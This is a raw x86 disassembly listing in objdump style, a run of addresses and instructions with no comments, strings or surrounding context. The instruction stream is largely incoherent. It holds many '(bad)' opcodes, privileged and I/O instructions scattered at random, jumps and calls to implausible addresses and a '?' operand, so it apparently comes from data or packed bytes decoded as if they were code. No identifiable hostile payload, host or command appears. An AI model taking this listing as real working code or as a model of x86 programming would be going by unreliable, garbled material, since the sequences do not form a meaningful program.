  43196d:	add    ebx,DWORD PTR [ecx-0x743ecdf1]
  431973:	dec    ebp
  431974:	mov    al,0x8b
  431976:	dec    ebp
  431977:	in     al,dx
  431978:	xor    edx,ecx
  43197a:	xor    edx,eax
  43197c:	add    eax,DWORD PTR [ebp+0x3]
  43197f:	jbe    0x431990
  431981:	mov    eax,ecx
  431983:	test   al,0x45
  431985:	dec    ebp
  431986:	mov    DWORD PTR [ebx],esi
  431988:	loopne 0x4319bd
  43198a:	inc    ebp
  43198b:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  431991:	rol    esi,0x45
  431994:	scas   eax,DWORD PTR es:[edi]
  431995:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  43199b:	mov    eax,ecx
  43199d:	hlt    
  43199e:	dec    ebp
  43199f:	inc    ebp
  4319a0:	mov    eax,edi
  4319a2:	loopne 0x43197c
  4319a4:	retf   
  4319a5:	test   esi,ecx
  4319a7:	clc    
  4319a8:	scas   eax,DWORD PTR es:[edi]
  4319a9:	inc    ebp
  4319aa:	mov    eax,edi
  4319ac:	fdiv   st,st(0)
  4319ae:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  4319b4:	cdq    
  4319b5:	cmp    BYTE PTR [edx],dh
  4319b7:	pushf  
  4319b8:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  4319be:	inc    esi
  4319c0:	mov    ebp,DWORD PTR [eax-0x10]
  4319c3:	inc    ebp
  4319c4:	dec    ebp
  4319c5:	xor    esi,DWORD PTR [ebx]
  4319c7:	add    eax,DWORD PTR [ebx]
  4319c9:	loopne 0x4319da
  4319cb:	dec    ebp
  4319cc:	ror    DWORD PTR [edx+0x7233084d],0x3
  4319d3:	add    BYTE PTR [ebx-0x7b740bbb],cl
  4319d9:	lock cdq 
  4319db:	ret    
  4319dc:	xor    al,BYTE PTR [ebp-0x77]
  4319df:	mov    esi,esp
  4319e1:	rol    BYTE PTR [ebp-0x7c],1
  4319e4:	xor    ebx,DWORD PTR [ecx-0x7772cd47]
  4319ea:	call   edi
  4319ec:	enter  0x4d45,0x8b
  4319f0:	mov    esi,eax
  4319f2:	fmul   st(3),st
  4319f4:	push   ebp
  4319f5:	dec    ebp
  4319f6:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  4319fc:	ret    0xc199
  4319ff:	xor    al,BYTE PTR [esi-0x280276]
  431a05:	dec    ebp
  431a06:	jne    0x431a3b
  431a08:	mov    eax,DWORD PTR [ebx]
  431a0a:	cld    
  431a0b:	loopne 0x4319bd
  431a0d:	push   ebp
  431a0e:	add    DWORD PTR [eax+0x72851100],ecx
  431a14:	inc    DWORD PTR [eax]
  431a16:	inc    DWORD PTR [ebp-0x75]
  431a19:	mov    edi,esp
  431a1b:	lock add bl,0x1
  431a1f:	retf   
  431a20:	add    dh,al
  431a22:	xor    dh,cl
  431a24:	inc    ebp
  431a25:	scas   eax,DWORD PTR es:[edi]
  431a26:	mov    eax,DWORD PTR [ebx]
  431a28:	shl    al,0x0
  431a2b:	inc    ebp
  431a2c:	dec    DWORD PTR [ebx+0x4dccf0ff]
  431a32:	call   0x462c6a
  431a37:	ud0    eax,ecx
  431a3a:	adc    al,0x4d
  431a3c:	inc    ebp
  431a3d:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  431a43:	lock push 0x338055
  431a49:	add    eax,DWORD PTR [eax]
  431a4b:	ud0    ecx,edx
  431a4e:	sbb    BYTE PTR [ebp+0x5e],dl
  431a51:	xor    ecx,ecx
  431a53:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  431a5a:	push   ecx
  431a5b:	add    BYTE PTR [ebp-0x38],cl
  431a5e:	mov    DWORD PTR [esi-0x740004],eax
  431a64:	cld    
  431a65:	inc    ebp
  431a66:	nop
  431a67:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  431a6d:	xabort 0xaf
  431a70:	icebp  
  431a71:	mov    esi,DWORD PTR [ebp-0x28]
  431a74:	(bad)  
  431a75:	retf   
  431a76:	or     ecx,eax
  431a78:	(bad)  
  431a79:	dec    ebp
  431a7a:	pop    es
  431a7b:	(bad)  
  431a7c:	(bad)  
  431a7d:	or     BYTE PTR [esi],al
  431a7f:	jb     0x431a47
  431a81:	add    BYTE PTR [ebx],al
  431a83:	inc    ebp
  431a84:	(bad)  
  431a85:	mov    ecx,DWORD PTR [edx]
  431a87:	fadd   st(6),st
  431a89:	ret    
  431a8a:	add    ah,BYTE PTR [edi-0x37]
  431a8d:	int    0x55
  431a8f:	sub    ebp,esp
  431a91:	add    edx,DWORD PTR [ecx-0x14]
  431a94:	inc    ebp
  431a95:	inc    ebp
  431a96:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  431a9c:	cld    
  431a9d:	(bad)  
  431a9e:	mov    WORD PTR [edi+0xf893be0],gs
  431aa4:	mov    ebp,ebp
  431aa6:	clc    
  431aa7:	push   eax
  431aa9:	push   DWORD PTR [ebp-0x4]
  431aac:	mov    BYTE PTR [ebp+0xa],0xff
  431ab0:	(bad)  
  431ab1:	int3   
  431ab2:	or     BYTE PTR [eax],al
  431ab4:	(bad)  
  431ab5:	lea    eax,[edi]
  431ab7:	ins    BYTE PTR es:[edi],dx
  431ab8:	(bad)  
  431ab9:	inc    DWORD PTR [ecx]
  431abb:	push   eax
  431abc:	mov    BYTE PTR [ebp+0x9],0x8b
  431ac0:	leave  
  431ac1:	les    edx,FWORD PTR [ebp+0x0]
  431ac4:	in     al,dx
  431ac5:	call   DWORD PTR [ecx-0x75]
  431ac8:	inc    ebp
  431ac9:	cld    
  431aca:	mov    DWORD PTR [eax+0x8b01fc],eax
  431ad0:	cld    
  431ad1:	xor    BYTE PTR [edi-0x76a8f98b],bh
  431ad7:	std    
  431ad8:	mov    eax,DWORD PTR [eax]
  431ada:	clc    
  431adb:	test   eax,esi
  431add:	je     0x431b54
  431adf:	mov    eax,esi
  431ae1:	cld    
  431ae2:	add    al,0x80
  431ae4:	add    WORD PTR [ecx+0x0],ax
  431ae8:	fiadd  DWORD PTR [eax]
  431aea:	mov    BYTE PTR [eax],0xd6
  431aed:	push   0xffffffc3
  431aef:	push   edi
  431af0:	mov    edx,DWORD PTR [eax+0x51]
  431af3:	pop    edi
  431af4:	lea    ebx,[ebx-0x8]
  431af7:	ret    0x45
  431afa:	mov    ecx,DWORD PTR [ebx-0x7243ae04]
  431b00:	xchg   eax,edi
  431b02:	mov    DWORD PTR [ebp-0x75],ecx
  431b05:	push   esi
  431b06:	clc    
  431b07:	jne    0x431ad9
  431b09:	mov    ecx,0xf8450b0b
  431b0e:	(bad)  
  431b0f:	push   cs
  431b10:	or     BYTE PTR [ebp-0x3a],dh
  431b13:	cmp    eax,DWORD PTR [ecx]
  431b15:	pop    esi
  431b16:	(bad)  
  431b17:	or     al,0x5
  431b19:	inc    eax
  431b1a:	leave  
  431b1b:	jmp    0x40cf:0x21564204
  431b22:	leave  
  431b23:	jmp    0xdace5c27
  431b28:	mov    eax,DWORD PTR [edx-0x3a]
  431b2b:	jle    0x431b23
  431b2d:	inc    eax
  431b2e:	nop
  431b2f:	in     al,dx
  431b30:	inc    ebx
  431b32:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  431b38:	add    eax,0xff45e8f8
  431b3d:	push   esi
  431b3e:	push   DWORD PTR [ebp-0x39]
  431b41:	mov    eax,0x7e9da46
  431b46:	or     al,0x6
  431b48:	push   DWORD PTR [ebp-0x3a]
  431b4b:	cmp    eax,DWORD PTR [edx]
  431b4d:	pop    esi
  431b4e:	ret    
  431b4f:	or     al,0x56
  431b51:	inc    ecx
  431b52:	push   ebp
  431b53:	jle    0x431b41
  431b55:	inc    edx
  431b56:	inc    ebp
  431b57:	leave  
  431b58:	add    DWORD PTR [ecx+0x28],eax
  431b5b:	and    esp,edi
  431b5d:	inc    ecx
  431b5e:	jne    0x431b47
  431b60:	add    DWORD PTR [edx+0x1c],eax
  431b63:	retf   0xc38b
  431b66:	adc    al,0x8b
  431b68:	xchg   edx,eax
  431b69:	push   ecx
  431b6a:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  431b70:	rcl    DWORD PTR [esi-0x9],cl
  431b73:	jne    0x431bc5
  431b75:	mov    eax,0x7c80ece
  431b7a:	rol    DWORD PTR [esi],cl
  431b7c:	div    DWORD PTR [ebp+0x50]
  431b7f:	cmp    ecx,edx
  431b81:	pop    esi
  431b82:	dec    BYTE PTR [edx]
  431b84:	in     al,dx
  431b85:	inc    edx
  431b86:	sub    ebp,ebp
  431b88:	inc    eax
  431b89:	(bad)  
  431b8a:	push   eax
  431b8b:	add    edx,DWORD PTR [eax-0x13]
  431b8e:	push   edi
  431b8f:	add    dh,dh
  431b91:	leave  
  431b92:	adc    DWORD PTR [ebp-0x1],0xffffffec
  431b96:	add    BYTE PTR [ecx+0x0],dl
  431b99:	inc    ebp
  431b9a:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  431ba0:	add    BYTE PTR [eax-0x7fbf448],bh
  431ba6:	add    al,0x2
  431ba8:	jmp    0x57ec702
  431bad:	jne    0x431b97
  431baf:	mov    eax,DWORD PTR [edx]
  431bb1:	or     BYTE PTR [eax],al
  431bb3:	inc    ecx
  431bb4:	stc    
  431bb5:	jmp    0xe7825bf0
  431bba:	jge    0x431bfd
  431bbc:	mov    esi,ebp
  431bbe:	lock ret 0x7d
  431bc2:	and    ecx,DWORD PTR [ebx-0x171777]
  431bc8:	add    bh,bh
  431bca:	aad    0xd7
  431bcc:	add    dh,cl
  431bce:	clts   
  431bd0:	(bad)  
  431bd1:	call   0xffce1ad6
  431bd6:	hlt    
  431bd7:	iret   
  431bd8:	jge    0x431bb0
  431bda:	rol    DWORD PTR [esi-0x80],cl
  431bdd:	cmc    
  431bde:	or     BYTE PTR [edi-0x27],cl
  431be1:	(bad)  
  431be2:	out    dx,al
  431be3:	mov    eax,DWORD PTR [ebx]
  431be5:	(bad)  
  431be6:	pop    esi
  431be7:	push   es
  431be8:	cmp    al,0xe8
  431bea:	sar    edi,0x8
  431bed:	inc    DWORD PTR [edi]
  431bef:	inc    esi
  431bf0:	(bad)  
  431bf1:	in     al,dx
  431bf2:	jle    0x431c4b
  431bf4:	push   cs
  431bf5:	push   ebx
  431bf6:	add    BYTE PTR [ebx+0x24008b56],cl
  431bfc:	add    BYTE PTR [ebp+0x50],al
  431bff:	push   eax
  431c00:	add    DWORD PTR [ebx+0x757d1834],ecx
  431c06:	sub    edx,DWORD PTR [esi-0x24]
  431c09:	jne    0x431bc1
  431c0b:	lods   eax,DWORD PTR ds:[esi]
  431c0c:	mov    edx,DWORD PTR [edx-0x34]
  431c0f:	dec    esi
  431c10:	out    0x83,eax
  431c12:	into   
  431c13:	push   edi
  431c15:	loopne 0x431be5
  431c17:	shr    BYTE PTR [edx+ecx*4+0x0],1
  431c1b:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  431c22:	rol    DWORD PTR [edx],0x8
  431c25:	mov    esp,ecx
  431c27:	cmp    DWORD PTR [ebx],0xc
  431c2a:	mov    esi,0x5001c0
  431c2f:	push   eax
  431c30:	push   cs
  431c31:	push   eax
  431c32:	(bad)  
  431c33:	sub    edx,edi
  431c35:	push   esi
  431c36:	adc    al,0xcb
  431c38:	ins    DWORD PTR es:[edi],dx
  431c39:	mov    eax,0x203e8
  431c3e:	add    al,ah
  431c40:	ror    BYTE PTR [eax+0xc007c0],0xc0
  431c47:	add    dh,al
  431c49:	add    ah,ch
  431c4b:	rol    DWORD PTR [ebx-0x3595fb0d],1
  431c51:	pop    ecx
  431c52:	or     eax,ebx
  431c54:	cli    
  431c55:	add    BYTE PTR [ecx-0x4e728d1e],dh
  431c5b:	lea    ebp,[ebx]
  431c5d:	mov    edx,DWORD PTR [edx-0x4]
  431c60:	dec    ecx
  431c61:	inc    ebp
  431c62:	shr    BYTE PTR [ebx],0x4b
  431c65:	and    al,0x0
  431c67:	(bad)  
  431c68:	jne    0x431caf
  431c6a:	pop    eax
  431c6b:	mov    al,0x5a
  431c6d:	call   0x1421ecc
  431c72:	and    al,0x85
  431c74:	push   edx
  431c75:	add    BYTE PTR [eax+eax*1+0x0],ah
  431c79:	dec    ebp
  431c7a:	mov    cl,0x23
  431c7c:	jmp    0x431c6a
  431c7e:	mov    al,0xe7
  431c80:	call   0x1391f6e
  431c85:	shr    DWORD PTR [eax+ebx*2],cl
  431c88:	lock (bad) 
  431c8a:	adc    eax,0x757f008d
  431c8f:	out    0x58,eax
  431c91:	cmp    al,0x7
  431c93:	pop    edx
  431c94:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  431c9b:	push   ecx
  431c9c:	cld    
  431c9d:	mov    esi,0x3b0175
  431ca2:	and    al,0xb0
  431ca4:	xor    BYTE PTR [edx+0x1],0x8b
  431ca8:	add    ah,bh
  431caa:	mov    edi,DWORD PTR [ebp-0x4]
  431cad:	psubsw mm7,QWORD PTR [edi]
  431cb0:	add    DWORD PTR [ebp+0x0],ebp
  431cb3:	rcr    eax,1
  431cb5:	mov    edi,ecx
  431cb7:	and    eax,DWORD PTR [eax]
  431cb9:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  431cbf:	call   0x1301fa8
  431cc4:	add    al,cl
  431cc6:	mov    ebp,esi
  431cc8:	aam    0x83
  431cca:	or     DWORD PTR [ecx],eax
  431ccc:	jne    0x431cbf
  431cce:	mov    eax,DWORD PTR [eax]
  431cd0:	aam    0x0
  431cd2:	dec    ebp
  431cd3:	jne    0x431c60
  431cd5:	cmp    ebx,eax
  431cd7:	jb     0x431d26
  431cd9:	jmp    0x431c66
  431cdb:	mov    ebx,esp
  431cdd:	int3   
  431cde:	dec    ebp
  431cdf:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  431ce6:	mov    edx,0x8b0a8b
  431ceb:	cmp    ecx,DWORD PTR [eax]
  431ced:	jb     0x431cc6
  431cef:	pop    edx
  431cf0:	push   edi
  431cf1:	cli    
  431cf2:	pop    es
  431cf3:	mov    eax,ecx
  431cf5:	jb     0x431cf9
  431cf7:	add    DWORD PTR [ebx],0xa
  431cfa:	mov    eax,DWORD PTR [ebx]
  431cfc:	int3   
  431cfd:	add    bh,BYTE PTR [esi+0x75d10006]
  431d03:	jmp    0x431c90
  431d05:	mov    al,0xe8
  431d07:	call   0x1041f89
  431d0c:	add    edx,DWORD PTR [ecx+ecx*8]
  431d0f:	pop    edi
  431d10:	or     BYTE PTR [ecx-0x73],bl
  431d13:	pop    ecx
  431d14:	inc    edi
  431d15:	xor    al,0xeb
  431d17:	push   ecx
  431d18:	mov    edi,DWORD PTR [edx+0xc506cc]
  431d1e:	call   0xb21e23
  431d23:	int3   
  431d24:	sbb    BYTE PTR [esi],ch
  431d26:	inc    ebp
  431d27:	add    BYTE PTR [ebx-0x1f4f338b],cl
  431d2d:	call   0x9c1f9c
  431d32:	or     BYTE PTR [ebx-0x73],dl
  431d35:	cmp    al,0x47
  431d37:	mov    al,0x1
  431d39:	jb     0x431d3b
  431d3b:	mov    al,0x10
  431d3d:	push   eax
  431d3e:	add    al,0x75
  431d40:	add    BYTE PTR [ebx],ch
  431d42:	add    ebx,esp
  431d44:	int3   
  431d45:	jne    0x431d57
  431d47:	movsx  edx,cl
  431d4a:	add    DWORD PTR [eax],eax
  431d4c:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  431d53:	mov    gs,edi
  431d55:	add    BYTE PTR [eax-0x50],ch
  431d58:	add    al,ch
  431d5a:	mov    eax,DWORD PTR [ecx]
  431d5c:	sub    eax,DWORD PTR [eax]
  431d5e:	jb     0x431dd5
  431d60:	add    DWORD PTR [esp+eiz*8-0x50],esi
  431d64:	jge    0x431d4e
  431d66:	add    al,0x1
  431d68:	add    DWORD PTR [eax],0x0
  431d6b:	jne    0x431d6d
  431d6d:	je     0x431db4
  431d6f:	mov    eax,DWORD PTR [edi]
  431d71:	ror    BYTE PTR [ebp+0x4d],1
  431d74:	or     DWORD PTR [ecx+0x4d03d004],0x3
  431d7b:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431d81:	mov    DWORD PTR [ebx],ebp
  431d83:	fadd   DWORD PTR [eax+0x75]
  431d86:	inc    eax
  431d87:	pop    eax
  431d88:	lea    ebx,[ecx+0x4f]
  431d8b:	push   0xb1000003
  431d90:	out    dx,eax
  431d91:	add    ebp,DWORD PTR [edx+edx*2]
  431d94:	add    BYTE PTR [ebx+ecx*4],bh
  431d97:	mov    ch,BYTE PTR [ebx]
  431d99:	jb     0x431e0d
  431d9b:	add    al,0x89
  431d9d:	push   eax
  431d9e:	call   0x842b6b10
  431da3:	add    DWORD PTR [eax+eax*1],eax
  431da6:	jae    0x431dbc
  431da8:	icebp  
  431da9:	inc    ebp
  431daa:	mov    eax,DWORD PTR gs:[ecx]
  431dad:	int3   
  431dae:	out    dx,al
  431daf:	loopne 0x431dfe
  431db1:	sub    eax,DWORD PTR [edx]
  431db3:	push   0xffffff83
  431db5:	pop    esi
  431db6:	push   cs
  431db7:	jl     0x431dd2
  431db9:	add    al,0xaf
  431dbb:	xor    eax,0x832b6d00
  431dc0:	mov    eax,DWORD PTR [edx]
  431dc2:	rcr    BYTE PTR [ebp+0x754500dc],cl
  431dc8:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431dce:	inc    ebp
  431dcf:	shr    ebx,0x3
  431dd2:	or     DWORD PTR [eax],0x4
  431dd5:	push   0xffffffa5
  431dd7:	pop    esi
  431dd8:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431ddf:	jmp    0x431e3e
  431de1:	mov    edi,0xff0272
  431de6:	fdivr  QWORD PTR [ebp+0x5d]
  431de9:	push   0x4e
  431deb:	pop    ecx
  431dec:	call   0x4361f1
  431df1:	mov    DWORD PTR [ebx],eax
  431df3:	in     al,0xc8
  431df5:	rol    BYTE PTR [ebp-0x75],0xc1
  431df9:	call   0xad1fda
  431dfe:	pop    esi
  431dff:	enter  0xceff,0x8b
  431e03:	repz mov ecx,DWORD PTR [ebp-0x34]
  431e07:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431e0e:	je     0x431e10
  431e10:	or     DWORD PTR [ebx-0x74183b24],eax
  431e16:	jne    0x431dfc
  431e18:	jmp    0x431e13
  431e1a:	push   DWORD PTR [edx-0x24]
  431e1d:	push   0x4d
  431e1f:	pop    ecx
  431e20:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431e24:	jge    0x431e2c
  431e26:	mov    eax,eax
  431e28:	sub    ebp,DWORD PTR [edx+0x24]
  431e2b:	pop    esi
  431e2c:	inc    ebp
  431e2d:	mov    esp,0x8b6077
  431e32:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  431e38:	lods   al,BYTE PTR ds:[esi]
  431e39:	add    BYTE PTR [ebx],bh
  431e3b:	enter  0xce73,0x49
  431e3f:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431e47:	stc    
  431e48:	jge    0x431ebc
  431e4a:	jnp    0xdd42a1b9
  431e50:	call   0xc61f26
  431e55:	fadd   st(0),st
  431e57:	dec    esi
  431e58:	ins    BYTE PTR es:[edi],dx
  431e59:	stc    
  431e5a:	cmp    al,0x73
  431e5c:	push   ebp
  431e5d:	mov    eax,0xf8028b
  431e62:	jne    0x431e25
  431e64:	mov    esi,ecx
  431e66:	mov    esp,DWORD PTR [ebp+0x2c]
  431e69:	add    edi,DWORD PTR [ebp-0x24]
  431e6c:	sub    esp,eax
  431e6e:	and    al,0x45
  431e70:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431e76:	sbb    al,0xee
  431e78:	pop    esi
  431e79:	call   0x831ea9
  431e7e:	fsubr  st,st(3)
  431e80:	sti    
  431e81:	add    BYTE PTR gs:[ecx],bh
  431e84:	add    eax,esp
  431e86:	add    DWORD PTR [esi],eax
  431e88:	rol    DWORD PTR [ebp+0x8],0x29
  431e8c:	mov    esp,eax
  431e8e:	clc    
  431e8f:	jne    0x431f06
  431e91:	mov    eax,0x8b0673
  431e96:	loopne 0x431edd
  431e98:	loopne 0x431e23
  431e9a:	lods   al,BYTE PTR ds:[esi]
  431e9b:	int3   
  431e9c:	inc    ebp
  431e9d:	mov    DWORD PTR gs:[eax+edi*8],eax
  431ea1:	add    al,0xc3
  431ea3:	sub    ecx,DWORD PTR [ebp+0x47]
  431ea6:	(bad)  
  431ea8:	shr    BYTE PTR [ebp-0x1f],0xe8
  431eac:	add    eax,DWORD PTR [eax]
  431eae:	call   0x644dfb3
  431eb3:	add    esi,DWORD PTR [esi-0x3b2efc83]
  431eb9:	dec    esi
  431eba:	ins    DWORD PTR es:[edi],dx
  431ebb:	in     al,dx
  431ebc:	lea    eax,[eax]
  431ebe:	inc    ebp
  431ebf:	inc    ebp
  431ec0:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431ec6:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431ed0:	and    al,0xdc
  431ed2:	ror    DWORD PTR [edx+0x24],0xf7
  431ed6:	or     BYTE PTR [ebp+0x4c],dh
  431ed9:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431edd:	stos   BYTE PTR es:[edi],al
  431ede:	adc    edx,edi
  431ee0:	inc    esp
  431ee1:	add    edi,DWORD PTR [eax]
  431ee3:	jne    0x431ec8
  431ee5:	mov    DWORD PTR [eax-0x7449db04],ecx
  431eeb:	cmp    ecx,DWORD PTR [edi]
  431eed:	sub    BYTE PTR [ebp-0x7e],dl
  431ef0:	sar    ebp,0xb
  431ef3:	jmp    FWORD PTR [edi+0x2400392a]
  431ef9:	sub    esi,DWORD PTR [ebx-0x73]
  431efc:	mov    esp,DWORD PTR [ecx+edi*4]
  431eff:	mov    ecx,DWORD PTR [eax]
  431f01:	and    BYTE PTR [eax],al
  431f03:	jne    0x431ecf
  431f05:	sub    ebp,ecx
  431f07:	sbb    BYTE PTR [esi+0x32],ah
  431f0a:	dec    ebp
  431f0b:	push   ebp
  431f0c:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431f12:	ret    
  431f13:	mov    edx,ebp
  431f15:	leave  
  431f16:	sub    DWORD PTR [esi+0x24],ebx
  431f19:	ret    0x2b
  431f1c:	pop    ax
  431f1e:	push   ebp
  431f1f:	rol    BYTE PTR [ebx],0xeb
  431f22:	add    DWORD PTR [ecx+0x6c0001],0x40
  431f29:	jb     0x431f80
  431f2b:	ret    
  431f2c:	in     al,dx
  431f2d:	jecxz  0x431eba
  431f2f:	push   esi
  431f30:	xchg   esp,eax
  431f31:	jne    0x431f33
  431f33:	cmp    edx,DWORD PTR [esi+0x1c]
  431f36:	jne    0x431f1c
  431f38:	mov    eax,DWORD PTR [ebp-0x77]
  431f3b:	ror    DWORD PTR [ebx+0x899408],0xe0
  431f42:	mov    esi,DWORD PTR [ebp-0x75]
  431f45:	pop    esi
  431f46:	nop
  431f47:	mov    eax,DWORD PTR [eax]
  431f49:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431f4f:	add    al,0x0
  431f51:	inc    ebp
  431f52:	mov    eax,DWORD PTR [ebx]
  431f54:	mov    ebp,ebx
  431f56:	cmp    al,0xf
  431f58:	or     al,al
  431f5a:	inc    ebp
  431f5b:	inc    ebp
  431f5c:	mov    ebx,DWORD PTR ss:[eax+ecx*8+0xfc6c8b]
  431f64:	mov    bh,0xc0
  431f66:	push   ss
  431f67:	ins    BYTE PTR es:[edi],dx
  431f68:	push   ecx
  431f69:	add    BYTE PTR [ecx-0x5],dl
  431f6c:	add    eax,0x17200
  431f71:	sbb    al,0x85
  431f73:	dec    esp
  431f74:	je     0x431fae
  431f76:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  431f7a:	add    BYTE PTR [ebx],bh
  431f7c:	(bad)  
  431f7d:	and    al,0x39
  431f7f:	jae    0x431f1d
  431f81:	mov    cl,cl
  431f83:	inc    DWORD PTR [esp]
  431f86:	push   ebp
  431f87:	shr    esp,0x8
  431f8a:	in     al,dx
  431f8b:	push   esp
  431f8c:	add    DWORD PTR [eax],esp
  431f8e:	add    bl,cl
  431f90:	inc    ebp
  431f91:	mov    bh,0x89
  431f93:	add    ah,bh
  431f95:	jmp    0xca7c2edf
  431f9a:	pushf  
  431f9b:	dec    esp
  431f9c:	mov    edx,0xf8178520
  431fa1:	fst    DWORD PTR [ebp+0x0]
  431fa4:	mov    BYTE PTR [eax],0xc4
  431fa7:	sub    edx,DWORD PTR [ebx-0x3f]
  431faa:	inc    ebp
  431fab:	add    eax,0xc601da
  431fb0:	mov    al,0xc6
  431fb3:	ins    BYTE PTR es:[edi],dx
  431fb4:	mov    DWORD PTR [eax+0x57],0x280545c1
  431fbb:	dec    esp
  431fbc:	jmp    DWORD PTR [eax]
  431fbe:	inc    ebp
  431fbf:	fnstcw WORD PTR [esi+0x29]
  431fc2:	test   BYTE PTR [eax],0xc6
  431fc5:	rol    BYTE PTR [eax],0xc0
  431fc8:	lea    ecx,[ebp-0x3cf0dbcb]
  431fce:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431fd4:	inc    esi
  431fd5:	add    DWORD PTR [eax],ebx
  431fd7:	add    dh,bh
  431fd9:	mov    esi,DWORD PTR [edx+0x8]
  431fdc:	(bad)  
  431fdd:	fdiv   QWORD PTR ss:[ecx]
  431fe0:	(bad)  
  431fe1:	mov    bl,ch
  431fe3:	add    esi,eax
  431fe5:	add    dh,bl
  431fe7:	or     esi,eax
  431fe9:	mov    dl,0xdf
  431feb:	add    esi,eax
  431fed:	add    al,ah
  431fef:	push   cs
  431ff0:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431ff7:	or     BYTE PTR [ebx],dh
  431ff9:	dec    ecx
  431ffa:	lea    eax,[ebx]
  431ffc:	xor    eax,0x18fc0fc7
  432001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432002:	repz clc 
  432004:	add    eax,DWORD PTR [ebp+0x46]
  432007:	prefetcht0 BYTE PTR [ecx-0x2]
  43200b:	xor    eax,0x7c60872
  432010:	mov    esp,0xbd32c699
  432015:	pop    esi
  432016:	mov    cl,0xbe
  432019:	or     al,0xc6
  43201b:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  432022:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  432029:	add    dh,al
  43202b:	mov    eax,ebx
  43202d:	xor    DWORD PTR [ebx],0x35008dbc
  432033:	mov    ecx,DWORD PTR [edi]
  432035:	sbb    al,0x18
  432037:	inc    ebp
  432038:	xrelease mov DWORD PTR [ebx],0x188546f4
  43203f:	clc    
  432040:	(bad)  
  432041:	ss jb  0x431fe0
  432044:	lea    ecx,[ecx+0x45ffe838]
  43204a:	mov    ebp,esp
  43204c:	fadd   st,st(6)
  43204e:	dec    ebp
  43204f:	lds    edi,FWORD PTR [eax+0x7145fc56]
  432055:	out    0x1,eax
  432057:	inc    ebp
  432058:	lea    ebp,[ecx]
  43205a:	inc    esi
  43205c:	dec    eax
  43205e:	enter  0xa33,0xc6
  432062:	push   ebp
  432063:	leave  
  432064:	(bad)  
  432065:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43206b:	add    BYTE PTR [ebp+0x44],al
  43206e:	mov    eax,esp
  432070:	mov    WORD PTR [esi+0x44398300],?
  432076:	psubusw mm4,QWORD PTR [eax-0x78]
  43207a:	add    BYTE PTR [ebx-0x1303f975],al
  432080:	add    BYTE PTR [ebp+0x1],0xeb
  432084:	add    BYTE PTR [ebp+0x38],al
  432087:	jmp    0xdbce65d1
  43208c:	add    BYTE PTR [ebp+0x0],0xe8
  432090:	mov    DWORD PTR [ebp-0x48],eax
  432093:	sub    DWORD PTR [edi+0x45],ecx
  432096:	add    BYTE PTR [eax],ch
  432098:	js     0x4320df
  43209a:	data16 jle 0x432022
  43209d:	idiv   bh
  43209f:	inc    esp
  4320a0:	(bad)  
  4320a1:	fadd   st(7),st
  4320a3:	mov    dh,0x89
  4320a5:	and    DWORD PTR [esi+0x44],0xffffffff
  4320a9:	fld    DWORD PTR [ebx-0x767cbc78]
  4320af:	pop    es
  4320b0:	push   0x8d45ffec
  4320b5:	jmp    0xe6cc65bd
  4320ba:	push   0x45
  4320bc:	jmp    edx
  4320be:	add    DWORD PTR [ebp+0xd],0xfffffff5
  4320c2:	mov    DWORD PTR [ebp+0x6c],eax
  4320c5:	(bad)  
  4320c7:	inc    ebp
  4320c8:	(bad)  
  4320c9:	out    dx,al
  4320ca:	add    al,0x45
  4320cc:	mov    edi,esp
  4320ce:	outs   dx,BYTE PTR ds:[esi]
  4320cf:	inc    ebp
  4320d0:	(bad)  
  4320d1:	jle    0x432056
  4320d3:	idiv   BYTE PTR ds:0x70bc8944
  4320d9:	mov    dh,0xff
  4320db:	or     DWORD PTR [ebp-0x762609bc],0xffffff88
  4320e2:	jb     0x432067
  4320e4:	dec    DWORD PTR [eax]
  4320e6:	mov    ebp,esp
  4320e8:	test   WORD PTR [ebp-0x1],ax
  4320ef:	inc    ebp
  4320f0:	ror    BYTE PTR [ebx-0x137a279a],0xff
  4320f7:	adc    edi,edi
  4320f9:	mov    ebp,edi
  4320fb:	mov    eax,DWORD PTR [eax]
  4320fd:	cmp    BYTE PTR [esi-0x1],ah
  432100:	test   DWORD PTR [ebx],edi
  432102:	push   DWORD PTR [ebp-0x1]
  432105:	mov    DWORD PTR [esi-0x48],ebp
  432108:	add    BYTE PTR [ebp+0x66],al
  43210b:	jmp    0x432092
  43210d:	pushf  
  43210e:	dec    DWORD PTR [ebx-0x7f940301]
  432114:	add    BYTE PTR [ecx],al
  432116:	data16 add BYTE PTR [ebp-0x7a00c8],al
  43211d:	add    al,al
  43211f:	add    BYTE PTR [esi+0x45],ah
